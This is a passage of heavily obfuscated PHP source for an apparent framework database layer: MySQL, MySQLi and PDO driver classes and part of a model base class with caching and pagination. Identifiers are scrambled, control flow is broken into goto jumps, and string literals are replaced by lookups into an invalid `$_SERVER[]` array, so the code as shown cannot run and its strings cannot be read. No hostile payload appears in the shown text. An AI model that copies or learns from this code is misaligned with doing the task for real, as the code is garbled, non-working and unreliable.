|| !empty($Bݐ[$e޾[17]]) && !mysql_select_db($Bݐ[$e޾[17]], $this->linkID[$aڐ])) { think_exception(mysql_error()); } $dζ = mysql_get_server_info($this->linkID[$aڐ]); goto Dܖ; aȖ: } return $this->linkID[$aڐ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($F՚) { goto fĝ˾; B󐨏: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Aّ; aװ: think_action_status($cᕊ[19], 1); think_status($cᕊ[20]); $this->queryID = mysql_query($F՚, $this->_linkID); goto B󐨏; e: if (!$this->_linkID) { return !1; } $this->queryStr = $F՚; if ($this->queryID) { $this->free(); } goto aװ; fĝ˾: $cᕊ =& $_SERVER[]; if (0 === stripos($F՚, $cᕊ[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e; Aّ: } public function execute($cǾ) { goto CͰ; D܄բ: $this->queryStr = $cǾ; if ($this->queryID) { $this->free(); } think_action_status($Eâ[21], 1); goto B͏˨˥; B͏˨˥: think_status($Eâ[20]); $b䅶֭ = mysql_query($cǾ, $this->_linkID); $this->debug(); goto A޴; A޴: if (!1 === $b䅶֭) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto aÒκ; CͰ: $Eâ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D܄բ; aÒκ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][861], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C = mysql_query($_SERVER[][862], $this->_linkID); $this->transTimes = 0; if (!$C) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bŇę = mysql_query($_SERVER[][863], $this->_linkID); $this->transTimes = 0; if (!$bŇę) { $this->error(); return !1; } } return !0; } private function getAll() { $DŃ = array(); if ($this->numRows > 0) { while ($D = mysql_fetch_assoc($this->queryID)) { $DŃ[] = $D; } mysql_data_seek($this->queryID, 0); } return $DŃ; } public function getFields($B͹˦) { $bœ =& $_SERVER[]; $bĭƘ = $this->query($bœ[864] . $this->parseKey($B͹˦)); $C푊 = array(); if ($bĭƘ) { foreach ($bĭƘ as $E، => $Cà) { $C푊[$Cà[$bœ[27]]] = array($bœ[28] => $Cà[$bœ[27]], $bœ[29] => $Cà[$bœ[30]], $bœ[31] => (bool) (strtoupper($Cà[$bœ[32]]) === $bœ[865]), $bœ[34] => $Cà[$bœ[35]], $bœ[36] => strtolower($Cà[$bœ[37]]) == $bœ[38], $bœ[39] => strtolower($Cà[$bœ[40]]) == $bœ[41]); } } return $C푊; } public function getTables($E = '') { $aԪ =& $_SERVER[]; if (!empty($E)) { $e۸đ = $aԪ[866] . $E . $aԪ[867]; } else { $e۸đ = $aԪ[868]; } $d = $this->query($e۸đ); $B΃ = array(); foreach ($d as $ażȽ => $FΣȎ) { $B΃[$ażȽ] = current($FΣȎ); } return $B΃; } public function replace($CĔ, $fΛ = array()) { $C֑ =& $_SERVER[]; foreach ($CĔ as $f橓 => $e򮹕) { $F܉ = $this->parseValue($e򮹕); if (is_scalar($F܉)) { $DߺĹ[] = $F܉; $fԏ[] = $this->parseKey($f橓); } } $B = $C֑[869] . $this->parseTable($fΛ[$C֑[277]]) . $C֑[870] . implode($C֑[47], $fԏ) . $C֑[871] . implode($C֑[47], $DߺĹ) . $C֑[872]; return $this->execute($B); } public function insertAll($b, $Bփ = array(), $aޮ = false) { goto fТ; E튑: $F凓 = ($aޮ ? $dǆӧ[874] : $dǆӧ[875]) . $dǆӧ[876] . $this->parseTable($Bփ[$dǆӧ[277]]) . $dǆӧ[870] . implode($dǆӧ[47], $bǕЄ) . $dǆӧ[877] . implode($dǆӧ[47], $eՉ߹); return $this->execute($F凓); goto B̋; Fꍐ: $eՉ߹ = array(); foreach ($b as $c𧄕) { $fˏ = array(); foreach ($c𧄕 as $C䈊ش => $aʆ) { $aʆ = $this->parseValue($aʆ); if (is_scalar($aʆ)) { $fˏ[] = $aʆ; } } $eՉ߹[] = $dǆӧ[258] . implode($dǆӧ[47], $fˏ) . $dǆӧ[872]; } array_walk($bǕЄ, array($this, $dǆӧ[873])); goto E튑; fТ: $dǆӧ =& $_SERVER[]; if (!is_array($b[0])) { return !1; } $bǕЄ = array_keys($b[0]); goto Fꍐ; B̋: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $a˹ٜ =& $_SERVER[]; $this->error = mysql_errno() . $a˹ٜ[4] . mysql_error($this->_linkID); if ($a˹ٜ[33] != $this->queryStr) { $this->error .= LNG($a˹ٜ[45]) . $this->queryStr; } think_trace($this->error, $a˹ٜ[33], $a˹ٜ[46]); return $this->error; } public function escapeString($fߊ٣) { if ($this->_linkID) { return mysql_real_escape_string($fߊ٣, $this->_linkID); } else { return mysql_escape_string($fߊ٣); } } public function parseKey(&$dꌢ, $Fʤ = true) { $c =& $_SERVER[]; if ($Fʤ) { $dꌢ = $this->parseKeyCheck($dꌢ); } if ($dꌢ != $c[182] && !preg_match($c[878], $dꌢ)) { $dꌢ = $c[382] . trim($dꌢ, $c[382]) . $c[382]; } return $dꌢ; } } class DbMysqli extends Db { public function __construct($aӎ = '') { $Fڕ =& $_SERVER[]; if (!extension_loaded($Fڕ[764])) { think_exception(think_lang($Fڕ[10]) . $Fڕ[879]); } if (!empty($aӎ)) { $this->config = $aӎ; if (empty($this->config[$Fڕ[13]])) { $this->config[$Fڕ[13]] = $Fڕ[33]; } } } public function connect($eߏΌ = '', $B = 0) { $dں =& $_SERVER[]; if (!isset($this->linkID[$B])) { goto F; F: if (empty($eߏΌ)) { $eߏΌ = $this->config; } $this->linkID[$B] = new mysqli($eߏΌ[$dں[853]], $eߏΌ[$dں[855]], $eߏΌ[$dں[856]], $eߏΌ[$dں[17]], $eߏΌ[$dں[854]] ? intval($eߏΌ[$dں[854]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto C𐍏; dЊ: $this->connected = !0; if (1 != think_config($dں[18])) { unset($this->config); } goto b죋֑; C𐍏: $D܌ = $this->linkID[$B]->server_version; $this->linkID[$B]->query($dں[857] . think_config($dں[858]) . $dں[55]); if ($D܌ > $dں[859]) { $this->linkID[$B]->query($dں[860]); } goto dЊ; b죋֑: } return $this->linkID[$B]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aɏ) { goto d; d: $Eܟ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e; DۨԌ: think_status($Eܟ[20]); $this->queryID = $this->_linkID->query($aɏ); if ($this->_linkID->more_results()) { while (($C؅ = $this->_linkID->next_result()) != NULL) { $C؅->free_result(); } } goto f簾ɲ; f簾ɲ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto cɞݬ; e: $this->queryStr = $aɏ; if ($this->queryID) { $this->free(); } think_action_status($Eܟ[19], 1); goto DۨԌ; cɞݬ: } public function execute($D¶) { goto C; cߙȽ: $this->queryStr = $D¶; if ($this->queryID) { $this->free(); } think_action_status($D㋠[21], 1); goto d⒭ɦ; d⒭ɦ: think_status($D㋠[20]); $eج = $this->_linkID->query($D¶); $this->debug(); goto Dᄸ; Dᄸ: if (!1 === $eج) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eňț; C: $D㋠ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cߙȽ; eňț: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$a) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E = $this->_linkID->rollback(); $this->transTimes = 0; if (!$E) { $this->error(); return !1; } } return !0; } private function getAll() { $Bå = array(); if ($this->numRows > 0) { for ($e١Ӿ = 0; $e١Ӿ < $this->numRows; $e١Ӿ++) { $Bå[$e١Ӿ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Bå; } public function getFields($B) { $Eʮ =& $_SERVER[]; $bک = $this->query($Eʮ[864] . $this->parseKey($B)); $a = array(); if ($bک) { foreach ($bک as $dڴ => $F) { $a[$F[$Eʮ[27]]] = array($Eʮ[28] => $F[$Eʮ[27]], $Eʮ[29] => $F[$Eʮ[30]], $Eʮ[31] => (bool) ($F[$Eʮ[32]] === $Eʮ[33]), $Eʮ[34] => $F[$Eʮ[35]], $Eʮ[36] => strtolower($F[$Eʮ[37]]) == $Eʮ[38], $Eʮ[39] => strtolower($F[$Eʮ[40]]) == $Eʮ[41]); } } return $a; } public function getTables($B׆ = '') { $fЌ =& $_SERVER[]; $D馷 = !empty($B׆) ? $fЌ[866] . $B׆ . $fЌ[867] : $fЌ[868]; $Cֹ = $this->query($D馷); $d = array(); if ($Cֹ) { foreach ($Cֹ as $E͍ => $Eʾ) { $d[$E͍] = current($Eʾ); } } return $d; } public function replace($Bॴ, $A = array()) { $A =& $_SERVER[]; foreach ($Bॴ as $Fë => $B) { $A΃Ҽ = $this->parseValue($B); if (is_scalar($A΃Ҽ)) { $D[] = $A΃Ҽ; $eХ[] = $this->parseKey($Fë); } } $Dɥ١ = $A[869] . $this->parseTable($A[$A[277]]) . $A[870] . implode($A[47], $eХ) . $A[871] . implode($A[47], $D) . $A[872]; return $this->execute($Dɥ١); } public function insertAll($Aӏ, $c⠰ӎ = array(), $aƃ˟ = false) { goto c䌟˟; c䌟˟: $d =& $_SERVER[]; if (!is_array($Aӏ[0])) { return !1; } $fǳ፸ = array_keys($Aӏ[0]); goto Fɡ; Dߣ: $c׾ϕ = $aƃ˟ ? $d[874] : $d[875]; $Bڍ = $c׾ϕ . $d[876] . $this->parseTable($c⠰ӎ[$d[277]]) . $d[870] . implode($d[47], $fǳ፸) . $d[877] . implode($d[47], $Cӑ); return $this->execute($Bڍ); goto c肤; Fɡ: $Cӑ = array(); foreach ($Aӏ as $F׶) { $f = array(); foreach ($F׶ as $E˸ => $D) { $D = $this->parseValue($D); if (is_scalar($D)) { $f[] = $D; } } $Cӑ[] = $d[258] . implode($d[47], $f) . $d[872]; } array_walk($fǳ፸, array($this, $d[873])); goto Dߣ; c肤: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e⬝ =& $_SERVER[]; $this->error = $this->_linkID->errno . $e⬝[4] . $this->_linkID->error; if ($e⬝[33] != $this->queryStr) { $this->error .= LNG($e⬝[45]) . $this->queryStr; } think_trace($this->error, $e⬝[33], $e⬝[46]); return $this->error; } public function escapeString($DѤ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($DѤ); } else { return addslashes($DѤ); } } public function parseKey(&$fɟ, $b = true) { $Eڄͦ =& $_SERVER[]; if ($b) { $fɟ = $this->parseKeyCheck($fɟ); } if ($fɟ != $Eڄͦ[182] && !preg_match($Eڄͦ[878], $fɟ)) { $fɟ = $Eڄͦ[382] . trim($fɟ, $Eڄͦ[382]) . $Eڄͦ[382]; } return $fɟ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($b𕥪 = '') { $b򩪽 =& $_SERVER[]; if (!class_exists($b򩪽[880])) { think_exception(think_lang($b򩪽[10]) . $b򩪽[881]); } if (!empty($b𕥪)) { $this->config = $b𕥪; if (empty($this->config[$b򩪽[13]])) { $this->config[$b򩪽[13]] = array(); } } } public function connect($Aô = '', $bւ = 0) { $B닺 =& $_SERVER[]; if (!isset($this->linkID[$bւ])) { goto BÔ; FҾ: if (1 != think_config($B닺[18])) { unset($this->config); } goto e۵; D: try { $this->linkID[$bւ] = new PDO($Aô[$B닺[882]], $Aô[$B닺[855]], $Aô[$B닺[856]], $Aô[$B닺[13]]); } catch (PDOException $C䎠֜) { think_exception($C䎠֜->getMessage()); } $this->dbType = $this->_getDsnType($Aô[$B닺[882]]); if (in_array($this->dbType, array($B닺[883], $B닺[884], $B닺[885], $B닺[886]))) { think_exception($B닺[887] . $this->dbType . $B닺[888] . $this->dbType . $B닺[889]); } goto E; BÔ: if (empty($Aô)) { $Aô = $this->config; } $Aϱ = !empty($Aô[$B닺[13]][$B닺[14]]) ? $Aô[$B닺[13]][$B닺[14]] : $this->pconnect; if ($Aϱ) { $Aô[$B닺[13]][PDO::ATTR_PERSISTENT] = !0; } goto D; E: if (!$this->linkID[$bւ]) { think_exception($B닺[890]); } try { $this->linkID[$bւ]->exec($B닺[891] . think_config($B닺[858])); } catch (Exception $C䎠֜) { } $this->connected = !0; goto FҾ; e۵: } return $this->linkID[$bւ]; } public function free() { $this->PDOStatement = null; } public function query($c, $bȟ = array()) { goto bڔɼ; c๚: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bѱ۲ = $this->PDOStatement->execute($bȟ); $this->debug(); goto CҐ; bڔɼ: $D讒ӿ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cտ; CҐ: if (!1 === $bѱ۲) { $this->error(); return !1; } else { return $this->getAll(); } goto eɡꡞ; B釖: think_action_status($D讒ӿ[19], 1); think_status($D讒ӿ[20]); $this->PDOStatement = $this->_linkID->prepare($c); goto c๚; cտ: $this->queryStr = $c; if (!empty($bȟ)) { $this->queryStr .= $D讒ӿ[892] . print_r($bȟ, !0) . $D讒ӿ[893]; } if (!empty($this->PDOStatement)) { $this->free(); } goto B釖; eɡꡞ: } public function execute($Cա, $CǪ = array()) { goto Bۊ; C: $aԕЖ = $this->PDOStatement->execute($CǪ); $this->debug(); if (!1 === $aԕЖ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($c || preg_match($aٚ[898], $Cա)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto dݖ; eۯ: if ($this->dbType == $aٚ[886]) { if (preg_match($aٚ[894], $this->queryStr, $Cސˊ)) { $this->table = think_config($aٚ[895]) . str_ireplace(think_config($aٚ[896]), $aٚ[375], $Cސˊ[2]); $c = (bool) $this->query($aٚ[897] . strtoupper($this->table) . $aٚ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aٚ[21], 1); goto C¨; Bۊ: $aٚ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eʕ; C¨: think_status($aٚ[20]); $this->PDOStatement = $this->_linkID->prepare($Cա); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto C; Eʕ: $this->queryStr = $Cա; if (!empty($CǪ)) { $this->queryStr .= $aٚ[892] . print_r($CǪ, !0) . $aٚ[893]; } $c = !1; goto eۯ; dݖ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a = $this->_linkID->commit(); $this->transTimes = 0; if (!$a) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e҄ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$e҄) { $this->error(); return !1; } } return !0; } private function getAll() { $dذ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($dذ); return $dذ; } public function getFields($Bڥܶ) { goto C՗; Eٸə: return $Eü; goto Dڷ; C՗: $B侣Ա =& $_SERVER[]; $this->initConnect(!0); if (think_config($B侣Ա[899])) { $c· = str_replace($B侣Ա[900], $Bڥܶ, think_config($B侣Ա[899])); } else { switch ($this->dbType) { case $B侣Ա[883]: case $B侣Ա[901]: $c· = "\123\105\x4c\105\103\124\40\40\x20\x63\157\x6c\x75\x6d\156\x5f\x6e\141\x6d\x65\40\x61\x73\x20\x27\x4e\x61\155\145\x27\x2c\40\40\x20\144\x61\164\141\x5f\x74\171\x70\x65\40\x61\163\40\x27\x54\171\x70\145\47\54\x20\40\x20\143\x6f\154\x75\x6d\156\137\x64\145\x66\141\x75\154\164\40\141\163\x20\x27\x44\x65\146\x61\x75\x6c\164\x27\x2c\40\x20\x20\151\163\137\x6e\x75\154\x6c\141\142\x6c\x65\40\141\163\40\47\116\x75\154\154\x27\12\x9\x9\x46\x52\117\x4d\x9\151\156\146\157\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\150\x65\155\141\56\x74\x61\x62\154\145\163\x20\101\123\x20\164\12\x9\x9\112\x4f\x49\x4e\11\151\156\x66\157\162\x6d\x61\x74\x69\157\x6e\137\x73\143\x68\145\x6d\x61\56\143\x6f\154\x75\155\156\x73\40\x41\x53\x20\x63\12\11\x9\x4f\116\40\40\x74\56\x74\x61\142\x6c\x65\137\143\141\164\x61\154\157\147\x20\x3d\40\143\x2e\x74\141\x62\x6c\145\137\143\x61\x74\x61\x6c\157\147\12\11\11\x41\116\x44\x20\164\x2e\164\x61\x62\x6c\x65\x5f\163\x63\150\x65\155\141\x20\x3d\x20\x63\56\x74\x61\x62\x6c\145\x5f\163\x63\x68\x65\155\141\xa\x9\x9\x41\116\x44\x20\164\56\x74\141\x62\x6c\x65\137\x6e\141\x6d\x65\40\x3d\40\x63\x2e\x74\x61\x62\x6c\145\x5f\156\141\155\145\12\11\x9\x57\110\105\122\x45\x20\x20\x20\164\x2e\164\x61\x62\154\145\137\x6e\x61\155\145\x20\75\40\x27{$Bڥܶ}\47"; break; case $B侣Ա[902]: $c· = $B侣Ա[903] . $Bڥܶ . $B侣Ա[904]; break; case $B侣Ա[884]: case $B侣Ա[886]: $c· = $B侣Ա[905] . $B侣Ա[906] . $B侣Ա[907] . strtoupper($Bڥܶ) . $B侣Ա[908] . strtoupper($Bڥܶ) . $B侣Ա[909]; break; case $B侣Ա[910]: $c· = $B侣Ա[911] . $Bڥܶ . $B侣Ա[912]; break; case $B侣Ա[885]: break; case $B侣Ա[913]: default: $c· = $B侣Ա[914] . ($this->dbType == $B侣Ա[913] ? "\x60{$Bڥܶ}\140" : $Bڥܶ); } } goto f߄; f߄: $C = $this->query($c·); $Eü = array(); if ($C) { foreach ($C as $bü => $Cؐ) { $Cؐ = array_change_key_case($Cؐ); $Cؐ[$B侣Ա[28]] = isset($Cؐ[$B侣Ա[28]]) ? $Cؐ[$B侣Ա[28]] : $B侣Ա[375]; $Cؐ[$B侣Ա[29]] = isset($Cؐ[$B侣Ա[29]]) ? $Cؐ[$B侣Ա[29]] : $B侣Ա[375]; $D = isset($Cؐ[$B侣Ա[271]]) ? $Cؐ[$B侣Ա[271]] : $Cؐ[$B侣Ա[28]]; $Eü[$D] = array($B侣Ա[28] => $D, $B侣Ա[29] => $Cؐ[$B侣Ա[29]], $B侣Ա[31] => (bool) (isset($Cؐ[$B侣Ա[103]]) && $Cؐ[$B侣Ա[103]] === $B侣Ա[33] || isset($Cؐ[$B侣Ա[31]]) && $Cؐ[$B侣Ա[31]] === $B侣Ա[33]), $B侣Ա[34] => isset($Cؐ[$B侣Ա[34]]) ? $Cؐ[$B侣Ա[34]] : (isset($Cؐ[$B侣Ա[53]]) ? $Cؐ[$B侣Ա[53]] : $B侣Ա[375]), $B侣Ա[36] => isset($Cؐ[$B侣Ա[93]]) ? strtolower($Cؐ[$B侣Ա[93]]) == $B侣Ա[38] : (isset($Cؐ[$B侣Ա[54]]) ? $Cؐ[$B侣Ա[54]] : !1), $B侣Ա[39] => isset($Cؐ[$B侣Ա[915]]) ? strtolower($Cؐ[$B侣Ա[915]]) == $B侣Ա[41] : (isset($Cؐ[$B侣Ա[93]]) ? $Cؐ[$B侣Ա[93]] : !1)); } } goto Eٸə; Dڷ: } public function getTables($d稬 = '') { $eՊ =& $_SERVER[]; if (think_config($eՊ[916])) { $D، = str_replace($eՊ[917], $d稬, think_config($eՊ[916])); } else { switch ($this->dbType) { case $eՊ[884]: case $eՊ[886]: $D، = $eՊ[918]; break; case $eՊ[883]: case $eՊ[901]: $D، = $eՊ[919]; break; case $eՊ[910]: $D، = $eՊ[920]; break; case $eՊ[885]: think_exception(think_lang($eՊ[921]) . $eՊ[922]); break; case $eՊ[902]: $D، = $eՊ[42] . $eՊ[43] . $eՊ[44]; break; case $eՊ[913]: default: if (!empty($d稬)) { $D، = $eՊ[866] . $d稬 . $eՊ[867]; } else { $D، = $eՊ[868]; } } } $A㸂 = $this->query($D،); $f򢳝 = array(); foreach ($A㸂 as $c => $e) { $f򢳝[$c] = current($e); } return $f򢳝; } protected function parseLimit($C،뵽) { $C =& $_SERVER[]; $f = $C[33]; if (!empty($C،뵽)) { switch ($this->dbType) { case $C[910]: case $C[902]: $C،뵽 = explode($C[47], $C،뵽); if (count($C،뵽) > 1) { $f .= $C[48] . $C،뵽[1] . $C[49] . $C،뵽[0] . $C[50]; } else { $f .= $C[48] . $C،뵽[0] . $C[50]; } break; case $C[883]: case $C[901]: break; case $C[885]: break; case $C[884]: case $C[886]: break; case $C[913]: default: $f .= $C[48] . $C،뵽 . $C[50]; } } return $f; } public function parseKey(&$a, $AͫԶ = true) { $C =& $_SERVER[]; if ($AͫԶ) { $a = $this->parseKeyCheck($a); } if ($this->dbType == $C[913]) { if ($a != $C[182] && !preg_match($C[878], $a)) { $a = $C[382] . trim($a, $C[382]) . $C[382]; } return $a; } else { return parent::parseKey($a, $AͫԶ); } } public function close() { $this->_linkID = null; } public function error() { $Bђ =& $_SERVER[]; if ($this->PDOStatement) { $cӥ = $this->PDOStatement->errorInfo(); $this->error = $cӥ[1] . $Bђ[4] . $cӥ[2]; } else { $this->error = $Bђ[33]; } if ($Bђ[33] != $this->queryStr) { $this->error .= LNG($Bђ[45]) . $this->queryStr; } think_trace($this->error, $Bђ[33], $Bђ[46]); return $this->error; } public function escapeString($c˅Ԕ) { $DО =& $_SERVER[]; switch ($this->dbType) { case $DО[910]: case $DО[883]: case $DО[901]: case $DО[913]: return addslashes($c˅Ԕ); case $DО[885]: case $DО[902]: case $DО[884]: case $DО[886]: return str_ireplace($DО[55], $DО[56], $c˅Ԕ); } } protected function parseValue($eʈվ) { $f׌ي =& $_SERVER[]; if (is_string($eʈվ)) { $Aݝ = strpos($eʈվ, $f׌ي[4]) === 0 && in_array($eʈվ, array_keys($this->bind)); $eʈվ = $Aݝ ? $this->escapeString($eʈվ) : $f׌ي[923] . $this->escapeString($eʈվ) . $f׌ي[923]; } elseif (isset($eʈվ[0]) && is_string($eʈվ[0]) && strtolower($eʈվ[0]) == $f׌ي[295]) { $eʈվ = $this->escapeString($eʈվ[1]); } elseif (is_array($eʈվ)) { $eʈվ = array_map(array($this, $f׌ي[924]), $eʈվ); } elseif (is_bool($eʈվ)) { $eʈվ = $eʈվ ? $f׌ي[87] : $f׌ي[191]; } elseif (is_null($eʈվ)) { $eʈվ = $f׌ي[103]; } return $eʈվ; } public function getLastInsertId() { $B =& $_SERVER[]; switch ($this->dbType) { case $B[910]: case $B[902]: case $B[883]: case $B[901]: case $B[885]: case $B[913]: return $this->_linkID->lastInsertId(); case $B[884]: case $B[886]: $e񃤖 = $this->table; $Aڒ = $this->query("\123\105\114\105\x43\124\40{$e񃤖}\56\143\165\x72\162\166\x61\154\40\x63\x75\x72\x72\166\x61\154\40\106\x52\117\115\x20\144\x75\141\x6c"); return $Aڒ ? $Aڒ[0][$B[925]] : 0; } } } goto b; fդ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\x79\x54\x69\155\145", "\164\x69\155\x65", "\x69\156\163\x65\162\x74\x2c\x75\160\x64\x61\x74\x65", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\x63\x72\x65\141\x74\145\x54\151\155\145", "\x74\x69\155\x65", "\151\x6e\163\145\162\164", "\146\165\156\x63\164\x69\x6f\x6e")); public function setDataAuto($f) { $this->dataAuto = $f; } public function __construct($bȓ = '', $f눇 = '', $e = '') { parent::__construct($bȓ, $f눇, $e); } public static function textEncode($fߵ) { if (!$fߵ) { return $fߵ; } $F𠇪 = json_encode($fߵ); $F𠇪 = preg_replace_callback($_SERVER[][353], function ($D贿ܣ) { return addslashes($D贿ܣ[0]); }, $F𠇪); return json_decode($F𠇪); } public static function textDecode($d) { $Eġԍ =& $_SERVER[]; $dՏ = json_encode($d); $dՏ = preg_replace_callback($Eġԍ[354], function ($B˻) { return $_SERVER[][97]; }, $dՏ); return json_decode($dՏ); } protected $tableMeta = array(); protected function _beforeInsert(&$Bԑ, $bЍ) { $A =& $_SERVER[]; if (!$this->checkDataAutoHas($A[355])) { return; } $this->dataBeforeFilter($Bԑ, $A[355]); } protected function _beforeUpdate(&$e졼ݑ, $dձ) { $AÂǯ =& $_SERVER[]; if (!$this->checkDataAutoHas($AÂǯ[356])) { return; } $this->dataBeforeFilter($e졼ݑ, $AÂǯ[356]); } protected function _afterSelect(&$A齂ԫ, $bя) { if (!is_array($A齂ԫ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][357])) { return; } foreach ($A齂ԫ as &$cČ) { $this->dataAfterFilter($cČ); } unset($cČ); } protected function _afterFind(&$cĊ, $eݓ) { if (!is_array($cĊ)) { return; } if (!$this->checkDataAutoHas($_SERVER[][357])) { return; } $this->dataAfterFilter($cĊ); } public function setAutoIncrement($C) { $Fѣ = array($this->getPk() => $C); $DӅִ = $this->data($Fѣ)->add(); if ($DӅִ) { $this->delete($DӅִ); } } public function getAutoIncrement() { $dՍ = $this->getTableName(); $C = $this->max($this->getPk()); $eф = $this->query("\x73\150\157\x77\40\x74\x61\x62\154\145\x20\163\164\x61\164\165\163\40\167\x68\x65\x72\145\x20\116\x61\155\145\75\47{$dՍ}\47"); $A舉 = $eф[0][$_SERVER[][358]]; $d = max($C, $A舉); return $d; } protected function _callBefore($F둿, $bۢ͛) { return $this->cacheCallCheck($F둿, $bۢ͛, !1); } protected function _callAfter($bݪ, $Bב) { return $this->cacheCallCheck($bݪ, $Bב, !0); } protected function cacheFunctionAlias($d) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($C昮, $CĽ, $cͦ = false) { $d駄 = $this->cacheFunctionAlias($CĽ); if (!$d駄) { return; } foreach ($d駄 as $eƅ => $Bų) { $CΖɨ = $Bų[0]; $Dҷݗ = explode($_SERVER[][47], $Bų[1]); if ($C昮 == $eƅ) { return $this->cacheFunctionGet($eƅ, $CΖɨ); } if ($cͦ && in_array($C昮, $Dҷݗ)) { $this->cacheFunctionClear($eƅ, $CΖɨ); } } } public function cacheFunctionGet($f, $Cť˒) { $cב = $this->cacheKeyMake($f, $Cť˒); $FԲ· = Cache::get($cב); if (!is_array($FԲ·)) { $FԲ· = call_user_func_array(array($this, $f), array($Cť˒, !0)); Cache::set($cב, $FԲ·); } return $FԲ·; } public function cacheFunctionClear($B, $b) { $Bإ = $b; if (!is_array($b)) { $Bإ = array($b); } foreach ($Bإ as $c귲߫) { $d = $this->cacheKeyMake($B, $c귲߫); Cache::remove($d); } } private function cacheKeyMake($f؇, $C) { $aÿޖ =& $_SERVER[]; return get_class($this) . $aÿޖ[71] . $f؇ . $aÿޖ[359] . $C; } protected function selectPageReset() { $D늄 =& $_SERVER[]; if (isset($GLOBALS[$D늄[360]])) { return; } $GLOBALS[$D늄[360]] = isset($GLOBALS[$D늄[7]][$D늄[361]]) ? $GLOBALS[$D늄[7]][$D늄[361]] : !1; $GLOBALS[$D늄[362]] = isset($GLOBALS[$D늄[7]][$D늄[351]]) ? $GLOBALS[$D늄[7]][$D늄[351]] : !1; $GLOBALS[$D늄[7]][$D늄[361]] = !1; $GLOBALS[$D늄[7]][$D늄[351]] = !1; } protected function selectPageRestore() { $B =& $_SERVER[]; if (!isset($GLOBALS[$B[360]])) { return; } $GLOBALS[$B[7]][$B[361]] = $GLOBALS[$B[360]]; $GLOBALS[$B[7]][$B[351]] = $GLOBALS[$B[362]]; unset($GLOBALS[$B[360]]); unset($GLOBALS[$B[362]]); } protected function selectPage($b㟃 = 200, $Cǐ = 1) { goto d梅ܥ; F: $b㟃 = $b㟃 <= 5 ? 5 : ($b㟃 >= $dѩפ ? $dѩפ : $b㟃); $Cǐ = intval(isset($in[$a[351]]) && $in[$a[351]] ? $in[$a[351]] : $Cǐ); $Cǐ = $Cǐ <= 1 ? 1 : $Cǐ; goto D⳨莟; D⳨莟: $A״ߟ = array(); $bԚퟱ = 1; if ($Cǐ == 1 && $bԚퟱ) { $this->optionsValue($fպҡ); $A״ߟ = $this->page($Cǐ, $b㟃)->select(); $bך = is_array($A״ߟ) ? count($A״ߟ) : 0; if ($bך < $b㟃) { $AԶ˾ = 1; } else { $this->optionsValue($C趯); $bך = intval($this->count()); $AԶ˾ = ceil($bך / $b㟃); } } else { $this->optionsValue($C趯); $bך = intval($this->count()); $AԶ˾ = ceil($bך / $b㟃); $Cǐ = $Cǐ >= $AԶ˾ ? $AԶ˾ : $Cǐ; $this->optionsValue($fպҡ); $A״ߟ = $this->page($Cǐ, $b㟃)->select(); } goto d︄; B㯇: $C趯 = $fպҡ; $C趯[$a[363]] = array(); $b㟃 = intval($b㟃); goto F; d梅ܥ: $a =& $_SERVER[]; global $in; $fպҡ = $this->optionsValue(); goto b; E·: return $aȉ; goto F; b: $dѩפ = 50000; $b㟃 = isset($in[$a[361]]) && $in[$a[361]] ? $in[$a[361]] : $b㟃; if ($b㟃 === -1) { $in[$a[361]] = !1; $dѩפ = 100000000; $b㟃 = $dѩפ; } goto B㯇; d︄: if (!is_array($A״ߟ)) { 